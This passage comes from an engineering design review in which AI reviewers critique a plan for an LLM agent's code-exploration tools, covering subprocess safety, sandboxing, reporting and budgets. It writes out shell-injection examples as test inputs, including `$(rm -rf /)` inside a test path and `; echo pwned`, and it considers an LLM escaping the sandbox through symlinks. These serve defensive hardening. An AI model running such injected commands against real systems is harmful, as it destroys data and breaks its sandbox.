| R8-S3 | Data | Medium | Handle text decoding errors in `_read_file` with fallback (e.g., `errors="replace"`). | `Path.read_text()` assumes UTF-8. Legacy files (ISO-8859-1) or accidental binary reads will raise `UnicodeDecodeError`, crashing the agent loop ungracefully. | Section 5 (`_read_file`) | Test reading a binary file renamed to `.txt`; verify it returns a placeholder string or decoded content with replacements, not a crash. |
| R8-S4 | Architecture | Medium | Implement a `submit_report` tool for the final answer instead of parsing free-text `assistant` messages. | Parsing structured data from free-text chat responses is brittle and error-prone. A dedicated tool guarantees JSON structure via the provider's tool usage enforcement. | Section 5 (New tool: `_submit_report`) | Verify `get_tools` includes `submit_report` and `parse_final_output` extracts data from the tool use block. |
| R8-S5 | Ops | Low | Verify presence of binary dependencies (`grep`, test runners) during initialization. | `_search_codebase` relies on `grep` (often missing on Windows/minimal containers). Fail fast in `__init__` if critical binaries are missing rather than during execution. | Section 5 (`ExplorePhaseHandler.__init__`) | Mock missing `grep` and verify initialization raises a clear `ImportError` or `EnvironmentError`. |
| R8-S6 | Interfaces | Low | Map tool execution failures to Anthropic's `is_error` field in `tool_result` blocks. | The plan currently returns error strings as content. Anthropic's API supports an explicit `is_error: true` flag in `tool_result`. This helps the model distinguish "tool ran successfully but found nothing" from "tool failed to run". | Section 4 (Agent Loop Implementation) | Verify the `user` message constructed after a tool failure includes `"is_error": true` in the tool result block. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- R3-F4: Adding `confidence` and `partial` fields is critical for downstream robustness.
- R5-F3: Relative path support is essential for usability; LLMs struggle with absolute paths.
- R6-F2: Handling context window exhaustion is a necessary safety net for production stability.

#### Review Round R9

- **Reviewer**: claude-4 (claude-opus-4-6)
- **Date**: 2026-02-20 02:53:15 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R9-S1 | security | critical | The `_run_test` implementation uses `shell=True` with a whitelist regex, but the regex in Section 5 is unanchored at the end — it only matches the prefix. An attacker (or LLM) can append arbitrary shell commands after the whitelisted prefix via semicolons, pipes, or `$()`. Even with R4-F1's anchoring requirement accepted, the plan's concrete regex still lacks `$` anchor and the implementation uses `shell=True`. Require `shell=False` with `shlex.split()` and pass the command as a list, eliminating shell injection entirely. The whitelist then validates the executable and first arguments only. | R4-F1 was accepted requiring anchoring, but anchoring a regex while keeping `shell=True` is defense-in-depth at best — `shell=True` fundamentally allows metacharacter interpretation. The only robust fix is `shell=False`. The accepted R4-F1 + R1-F3 suggestions address the regex but not the root cause: `shell=True` itself. This is a second-order gap between accepted security suggestions that individually look sufficient but together still leave the injection surface open. | Section 5, `_run_test` implementation; Section 6, Sandboxing and Safety | Unit test: craft a command like `python -m pytest; echo pwned` and verify it is rejected or that only `pytest` runs. Integration test: verify `subprocess.run` is called with `shell=False` via mock inspection. |
| R9-S2 | architecture | high | The plan specifies using the synchronous `Anthropic` client (Section 3) but does not address client lifecycle — is a new client instantiated per `execute()` call, or once in `__init__`? If once in `__init__`, the client holds an HTTP connection pool that may go stale between workflow runs. If per-call, there's unnecessary overhead. The plan should specify client instantiation strategy and whether connection pooling/keepalive is appropriate. | Section 3 says "instantiate the synchronous `Anthropic` client directly in `ToolUsingPhaseHandler.__init__()`" but doesn't address what happens when the handler is reused across multiple workflow runs (e.g., in a long-running service). Connection pools can timeout, and the Anthropic SDK's `httpx` transport has default keepalive settings that may not match the usage pattern. | Section 3, "Decision: Direct Anthropic Client" | Add a test that creates a handler, waits >60s, then calls execute() to verify the client handles stale connections gracefully. Alternatively, verify the Anthropic SDK auto-reconnects. |
| R9-S3 | data | high | The `submit_report` tool (R8-F1, accepted) and `parse_final_output` create a dual-path output extraction problem. If the LLM calls `submit_report` on iteration 5 but continues exploring (doesn't send `end_turn`), then calls `submit_report` again on iteration 8 with updated findings, which report wins? The plan doesn't specify report supersession semantics. Similarly, if the LLM never calls `submit_report` (falls back to free text), `parse_final_output` must handle both paths. | R8-F1 was accepted but its interaction with the existing `parse_final_output` mechanism wasn't resolved. Two accepted suggestions (R8-F1 for submit_report and R4-S6 for parse robustness) now create ambiguity about which extraction path takes precedence and how multiple submissions are handled. | Section 4, Agent Loop; new subsection for submit_report tool semantics | Unit test: simulate a conversation with two `submit_report` calls and verify last-wins semantics. Test: simulate no `submit_report` call and verify `parse_final_output` free-text fallback engages. |
| R9-S4 | risks | high | The plan's implementation sequencing (Section 12) allocates Day 2 PM for both OTel instrumentation AND all unit+integration tests. With 27 unit tests and 6 integration tests specified, plus OTel wiring, this is significantly underestimated — especially given the mocking complexity for the Anthropic client, subprocess, and filesystem. The 2-day estimate was set before 58 suggestions added scope (submit_report tool, confidence fields, regex validation, context window handling, __init_subclass__ enforcement, etc.). | The original 2-day estimate predates the addition of substantial scope: submit_report tool, ToolResult type, confidence/partial fields, regex pre-validation, context window exhaustion handling, __init_subclass__ enforcement, cost_budget integration, and honest network isolation documentation. These collectively add ~1-1.5 days of implementation and testing effort. | Section 12, Implementation Sequencing; Feature Requirements "Estimated Effort" | Re-estimate after tallying all accepted suggestions. Count implementation items and test cases. Compare against team velocity benchmarks. |
| R9-S5 | interfaces | medium | The `_build_initial_message` method (accepted as abstract via R1-F2) and `get_system_prompt` both receive `context` but have no documented contract about which context keys each is responsible for consuming. If `get_system_prompt` includes the issue description AND `_build_initial_message` also includes it, the LLM receives it twice, wasting tokens. Conversely, if each assumes the other handles it, the LLM misses critical information. | R1-F2 and R6-F1 were independently accepted — one making _build_initial_message abstract, the other requiring explicit context key documentation. But the interaction between the two methods' context consumption was never specified. With both accepting `context`, there's no guidance on separation of concerns between them, leading to duplication or omission. | Section 4, Abstract Methods; or new subsection documenting method responsibilities | Code review checklist item: verify that each context key is consumed by exactly one of the two methods. Unit test: assert total token count of system_prompt + initial_message doesn't include duplicate content. |
| R9-S6 | ops | medium | The plan specifies that `_validate_path` resolves symlinks (Section 6) but doesn't address TOCTOU (time-of-check-time-of-use) race conditions. Between path validation and file read, a symlink target could change (e.g., if tests are running concurrently and creating/modifying symlinks). While unlikely in the read-only EXPLORE phase, `run_test` can execute tests that modify the filesystem, creating a window where validated paths become invalid or escape the sandbox. | R3-F3 (accepted) acknowledged that network isolation isn't enforceable, but filesystem isolation during concurrent test execution has the same class of problem. If `run_test` executes a test that creates a symlink pointing outside project_root, a subsequent `read_file` call could follow it. The sequential tool execution (R3-F2) reduces but doesn't eliminate this since tests run in subprocesses. | Section 6, Path Restriction | Document this as a known limitation. For v1, note that `run_test` subprocess modifications can affect subsequent tool calls' path safety. Recommend running EXPLORE in a copy-on-write filesystem or container for production use. |
| R9-S7 | validation | medium | The `ExplorePhaseOutput` model validates `fault_files`, `root_cause`, and `fix_approach` (Section 8), but with the accepted `confidence` and `partial` fields (R3-F4), the validation rules need conditional logic: a `partial: True` result with `confidence: 0.1` should be allowed to have empty `fault_files`, but a `confidence: 0.8` result with empty `fault_files` is likely a parsing error. The plan doesn't specify validation rules that account for these new fields. | R3-F4 added confidence and partial fields, and R4-S6/R5-S5 added parsing robustness and size constraints. But the exit validation model in Section 8 was defined before these suggestions and hasn't been updated to handle the interactions. A strict validator that requires non-empty `fault_files` will reject legitimate low-confidence partial results. | Section 8, Context Validation; `context_schema.py` ExplorePhaseOutput model | Unit test: validate that `ExplorePhaseOutput(fault_files=[], confidence=0.1, partial=True)` passes validation. Test that `ExplorePhaseOutput(fault_files=[], confidence=0.9, partial=False)` raises a warning or fails. |
| R9-S8 | architecture | medium | The plan states handlers "mutate `context` directly" (Section 8) but the agent loop in `execute()` returns `{"output": output, "cost": cost, "metadata": {...}}`. There's an unstated assumption that the orchestrator takes `result["output"]` and writes it to `context["localization"]`. The plan says the handler writes directly, but the `execute()` return signature doesn't support this — it returns output, not mutates context. Which is it? If the handler mutates context inside `execute()`, the returned `output` is redundant. If the orchestrator writes it, the handler doesn't need context access. | This is a contradiction between Section 8 ("Handler writes directly to context dict") and the `execute()` return type from the requirements (`{"output": Any, ...}`). Both mechanisms exist in the codebase (some phases mutate context, others return output for the orchestrator to write), but the plan must pick one for EXPLORE and be explicit. The choice affects testability — direct mutation is harder to test than returned values. | Section 8, Context Flow | Review existing phase handlers to determine which pattern is actually used. Standardize EXPLORE on the return-value pattern for testability. Unit test: verify `execute()` returns the localization dict as `output` without mutating context directly. |
| R9-S9 | security | medium | The `search_codebase` tool uses `subprocess.run(["grep", ...])` (Section 5) but doesn't specify handling of binary files. `grep` on binary files produces garbled output and can match spurious patterns. Large binary files (compiled assets, images, `.pyc`) waste time and produce meaningless results. | R7-F4 (accepted) adds regex pre-validation and file_glob restrictions but doesn't address binary file exclusion. This is a practical quality issue: searching binary files wastes tool execution time and pollutes results, causing the LLM to waste iterations on meaningless matches. | Section 5, `_search_codebase` implementation | Add `--binary-files=without-match` (or `-I`) flag to the `grep` invocation. Unit test: create a binary file in tmp_path and verify it's excluded from search results. |
| R9-S10 | data | medium | The plan doesn't specify message history truncation strategy for the agent loop. With 15 max iterations and tool results that can be up to 10,000 lines (read_file) or 5,000 chars (run_test), the message history can grow to hundreds of thousands of tokens — far exceeding both `token_budget` and the model's context window. R6-F2 (accepted) requires handling context window exhaustion, but the plan has no proactive strategy to prevent it. | R6-F2 addresses the reactive case (graceful termination on 400 error), but doesn't prevent it. R5-S5 caps `relevant_code` output but not intermediate tool results in the conversation history. A single `read_file` returning 10,000 lines could consume ~40K tokens of context. Combined with other tool results, the context window fills before `token_budget` triggers. Proactive truncation of old tool results (e.g., summarizing results older than N iterations) would prevent this. | Section 4, Message Management; new subsection on history management | Track cumulative message size. When approaching 75% of context window, truncate older tool results to summaries. Unit test: simulate a conversation that would exceed context window and verify truncation engages before the API returns 400. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- (No untriaged suggestions remain in Appendix C that are not already in Appendix A or B.)

#### Feature Requirements Suggestions

| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R9-F1 | Interface Design — `execute()` | Contradiction | The requirements show `execute()` calling `self._call_llm()` and returning `{"output": output}`, implying the orchestrator handles context writing. But the Integration section says "Handler writes directly to context dict: `context['localization'] = output`". These are two different patterns and the requirements specify both without reconciling them. The `execute()` signature doesn't even receive a mutable context reference in the return path — it receives `context` as input but returns a dict. | Implementers will be confused about whether to mutate `context` inside `execute()` or return output for the orchestrator. Testing strategy differs significantly between the two approaches. Existing handlers in the codebase may use either pattern inconsistently. | Pick one canonical pattern. Recommended: `execute()` returns `{"output": localization_dict, ...}` and the orchestrator writes `context["localization"] = result["output"]`. This matches the return type contract and is more testable. Update the Integration section accordingly. |
| R9-F2 | Tool Safety — `run_test` | Incomplete | The requirements specify `shell=True` for subprocess execution and a command whitelist regex as the security boundary. Even with the anchored regex from R4-F1, `shell=True` interprets shell metacharacters that appear *within* the whitelisted command's arguments (e.g., `python -m pytest 'tests/$(rm -rf /)'`). The regex anchors the prefix but LLM-supplied arguments after the prefix are unconstrained. | Shell injection via test path arguments. The LLM constructs the full command string including arguments, and those arguments are interpreted by the shell. A malicious or confused LLM could craft arguments containing shell metacharacters that execute arbitrary code. | Require `shell=False` with argument list parsing. The whitelist validates the command structure, then `shlex.split()` tokenizes it, and `subprocess.run()` receives a list. This eliminates shell interpretation entirely. |
| R9-F3 | Interface Design — `submit_report` tool | Missing specification | R8-F1 was accepted recommending a `submit_report` tool, but the requirements don't specify: (a) whether `submit_report` terminates the loop or allows continued exploration, (b) how multiple `submit_report` calls are handled, (c) the relationship between `submit_report` and `parse_final_output`, (d) the exact input_schema for the tool. | Without these details, the implementer must make design decisions that should be specified at the requirements level. The interaction between structured tool output and free-text parsing fallback is architecturally significant. | Add a subsection specifying: `submit_report` sets a flag that terminates the loop after the current iteration. Last call wins if multiple are made. `parse_final_output` first checks for `submit_report` payloads in the message history, falling back to free-text extraction only if none found. Define the input_schema matching `ExplorePhaseOutput` fields. |
| R9-F4 | Resource Limits | Missing specification | The requirements specify `token_budget` checks "AFTER adding response tokens but BEFORE executing tools" but don't specify what happens to the *current response's tool calls* when the budget is exceeded. If the LLM returns 3 tool_use blocks and the budget is exceeded after counting the response tokens, are the tool calls executed or skipped? | Skipping tool calls means the LLM's last response is never fulfilled, and the message history ends with an unanswered tool request. Executing them means exceeding the budget. Both have implications for `parse_final_output` — it may receive an incomplete conversation. | Specify: when token budget is exceeded after an LLM response, do NOT execute pending tool calls. Instead, append a synthetic assistant message summarizing the budget exhaustion, then call `parse_final_output`. This gives the parser a clean conversation to work with. (This interacts with R7-S3 which was accepted for budget-exhaustion summary calls.) |

#### Requirements Coverage

| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| Problem Statement (single-shot limitation) | Section 1, Section 3 | Full | None |
| Goal 1: Tool registry | Section 4 (Abstract Methods), Section 5 (Tool Implementations) | Full | None |
| Goal 2: Agent loop | Section 4 (Agent Loop Implementation) | Full | Message history growth not proactively managed (R9-S10) |
| Goal 3: Bounded iteration | Section 4 (Stop Conditions), Section 6 (Resource Limits) | Partial | Token budget check doesn't specify handling of pending tool calls at budget exhaustion (R9-F4) |
| Goal 4: Cost tracking | Section 3 (PricingService reuse), Section 7 (OTel attributes) | Full | R2-F1 (accepted) integration with global budget is specified |
| Goal 5: OTel instrumentation | Section 7 (OTel Instrumentation) | Full | None |
| Interface Design — AbstractPhaseHandler | Section 1 (unchanged) | Full | None |
| Interface Design — ToolUsingPhaseHandler | Section 4, `tool_using_handler.py` | Full | execute() non-override enforcement via R7-F1 accepted |
| Interface Design — get_tools() | Section 5 (Tool Implementations) | Full | Anthropic-specific format documented per R5-F2 |
| Interface Design — handle_tool_use() | Section 5 | Partial | Error handling contract (ToolResult vs exception) resolved by R1-F1 but plan Section 5 still says "return error string (don't raise)" — needs update to match ToolResult pattern |
| Interface Design — get_system_prompt() | Section 5 (ExplorePhaseHandler) | Full | Responsibility boundary with _build_initial_message unclear (R9-S5) |
| Interface Design — parse_final_output() | Section 5, Risk 4 | Partial | Interaction with submit_report tool (R8-F1) not specified (R9-F3) |
| Interface Design — execute() | Section 4 | Partial | Context mutation vs return-value pattern contradictory (R9-F1, R9-S8) |
| Concrete Implementation: ExplorePhaseHandler | Section 5 | Full | None |
| Tool Safety — Sandboxing | Section 6 | Partial | `shell=True` undermines regex-based security (R9-S1, R9-F2); TOCTOU risk with concurrent test execution (R9-S6) |
| Tool Safety — Resource Limits | Section 6 | Full | None |
| Tool Safety — No Destructive Operations | Section 6 | Partial | Network isolation honestly documented per R3-F3; binary file exclusion missing from grep (R9-S9) |
| OTel Instrumentation — per iteration | Section 7 | Full | None |
| OTel Instrumentation — phase level | Section 7 | Full | None |
| Integration — Phase Registration | Section 8 | Full | WorkflowPhase enum standardized per R1-F4 |
| Integration — Context Flow | Section 8 | Partial | Mutation vs return pattern contradiction (R9-F1); submit_report interaction undefined (R9-F3) |
| Estimated Effort (~2 days) | Section 12 | Partial | Underestimated given 58 accepted suggestions adding significant scope (R9-S4) |
| Dependencies | Section 3, Critical Files | Full | None |
| Open Question 1 (run_test in Explore) | Section 5 | Full | Answered yes with whitelist |
| Open Question 2 (streaming) | Section 3 | Full | Answered no for v1 |
| Open Question 3 (non-Python fallback) | Not addressed | None | Plan doesn't discuss non-Python project support at all. The requirements note Eagle's macro map as fallback but the plan doesn't specify how get_system_prompt adapts when codebase_summary is Python-only |

#### Review Round R10
- **Reviewer**: gemini-3 (gemini-3-pro-preview)
- **Date**: 2026-02-20 02:55:17 UTC
- **Scope**: Architecture-focused review

| ID | Area | Severity | Suggestion | Rationale | Proposed Placement | Validation Approach |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| R10-S1 | architecture | medium | Handle "dangling tool call" edge case at loop exit. | If the token/iteration budget is hit while the LLM is requesting a tool (stop_reason="tool_use"), the loop breaks. `parse_final_output` is then called with a history ending in a tool request, not a final answer. This will likely cause parsing failures or crashes. | Modify `execute` (Section 4): If loop terminates with pending tool calls, append a synthetic "Budget Exhausted" tool result before calling parser, or ensure parser handles incomplete history gracefully. | `test_parse_final_output_with_dangling_tool_call` |
| R10-S2 | security | high | Enforce default ignore patterns in `search_codebase` and `list_directory`. | `grep -r` or `rglob` on a project with `node_modules`, `.git`, or `.env` will waste massive tokens and risk leaking secrets. The plan relies on user-provided globs but lacks safe defaults. | Modify `_search_codebase` and `_list_directory` (Section 5) to hard-exclude `.git`, `.env`, `node_modules`, `__pycache__`, and `.DS_Store`. | `test_search_codebase_ignores_git_and_secrets` |
| R10-S3 | data | low | Use "Head + Tail" truncation for `run_test` output instead of simple truncation. | Test runners often print the summary and specific failure details at the very end. Truncating to the first 5,000 chars often cuts off the most critical information. | Modify `_run_test` (Section 5): If output > 5000 chars, keep first 2000 and last 3000. | `test_run_test_truncation_preserves_tail` |
| R10-S4 | ops | medium | Persist conversation history in `execute` metadata. | The plan returns `output` and metrics, but discards the `messages` list. Without the transcript, debugging *why* an agent failed or spent $5.00 is impossible. | Modify `execute` return value (Section 4) to include `messages` (or a summarized log) in `metadata`. | `test_metadata_includes_transcript` |
| R10-S5 | architecture | medium | Inject LLM client or factory via `__init__` instead of hardcoding `Anthropic()`. | Hardcoding `Anthropic()` inside the handler couples it to specific env var strategies and bypasses centralized configuration (proxy, logging, key rotation) used elsewhere in the SDK. | Modify `ToolUsingPhaseHandler.__init__` (Section 3) to accept an optional `client` or `client_factory`. | Verify `__init__` signature and client usage in tests. |

**Endorsements** (prior untriaged suggestions this reviewer agrees with):
- **R8-F1**: Using a `submit_report` tool is significantly more robust than parsing free-text markdown for the final result.
- **R7-F2**: Explicitly defining that EXPLORE overwrites context is critical for deterministic checkpoint restoration.

#### Feature Requirements Suggestions
| ID | Section | Issue Type | Description | Impact | Suggested Resolution |
| ---- | ---- | ---- | ---- | ---- | ---- |
| R10-F1 | Tool Specifications | Ambiguity | The `search_codebase` tool requires a "Regex pattern" but does not specify the regex flavor (PCRE vs Python `re`). | LLMs may generate regexes with lookaheads/lookbehinds that work in Python but fail in `grep` (or vice versa depending on flags), causing tool errors. | Specify that the pattern must be compatible with Python's `re` module (if using Python validation) or PCRE (if using `grep -P`). |
| R10-F2 | Interface Design | Missing Feature | The Agent Loop design assumes a "continue" loop. If a tool like `submit_report` is used (per R8-F1), the loop should terminate immediately to save a turn. | Without a termination signal, the agent must call `submit_report`, get a result, and then emit "I am done" in a separate turn, wasting time and tokens. | Add a `terminate_loop: bool` field to `ToolResult` or allow `handle_tool_use` to signal loop termination. |

#### Requirements Coverage
| Feature Doc Section | Plan Step(s) | Coverage | Gaps |
| ---- | ---- | ---- | ---- |
| **Interface Design** | | | |
| `ToolUsingPhaseHandler` ABC | Step 1, 4 | Full | |
| `get_tools` | Step 5 | Full | |
| `handle_tool_use` | Step 4, 5 | Full | |
| `get_system_prompt` | Step 5 | Full | |
| `parse_final_output` | Step 5 | Full | |
| `execute` (Agent Loop) | Step 4 | Full | "Dangling tool call" edge case (R10-S1) |
| **Concrete Implementation** | | | |
| `ExplorePhaseHandler` | Step 2, 5 | Full | |
| Tools (read, search, list, run) | Step 5 | Full | Missing ignore patterns (R10-S2), Truncation logic (R10-S3) |
| **Tool Safety** | | | |
| Sandboxing (`project_root`) | Step 6 | Full | |
| Resource Limits | Step 6 | Full | |
| No Destructive Ops | Step 6 | Full | |
| **OTel Instrumentation** | | | |
| Iteration/Tool spans | Step 7 | Full | |
| **Integration** | | | |
| `WorkflowPhase` registration | Step 8 | Full | |
| Context Flow | Step 8 | Full | |
